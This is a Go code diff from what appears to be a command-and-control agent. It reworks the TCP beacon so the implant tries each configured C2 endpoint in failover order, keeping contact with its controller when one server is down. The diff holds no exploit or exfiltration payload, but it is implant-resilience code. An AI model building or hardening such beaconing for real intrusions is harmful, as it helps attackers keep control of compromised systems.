@@ -394,16 +394,16 @@ func sendBeacon(body []byte) []byte {
 
 // sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
 // The C2 URL may be tcp://host:port, tls://host:port, or an http(s) URL whose
-// host:port is reused after transport failover — never dial the raw URL.
+// host:port is reused after transport failover — never dial the raw URL. The
+// endpoint list is swept in failover order, so a dead primary does not strand
+// an agent that has a second tcp:// or tls:// URL configured.
 func sendTCPBeacon(body []byte) []byte {
-	addr, scheme, ok := currentC2Dial()
-	if !ok {
-		if Debug {
-			fmt.Printf("[!] TCP beacon: cannot parse C2 address from %q\n", currentC2Raw())
-		}
-		return nil
-	}
+	return forEachC2Endpoint("tcp", func(_ int, raw, hostPort, scheme string) []byte {
+		return sendTCPBeaconAt(raw, hostPort, scheme, body)
+	})
+}
 
+func sendTCPBeaconAt(raw, addr, scheme string, body []byte) []byte {
 	var conn net.Conn
 	var err error
 
@@ -415,7 +415,7 @@ func sendTCPBeacon(body []byte) []byte {
 	}
 	if err != nil {
 		if Debug {
-			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
+			fmt.Printf("[!] TCP beacon to %s dial failed: %v\n", raw, err)
 		}
 		return nil
 	}
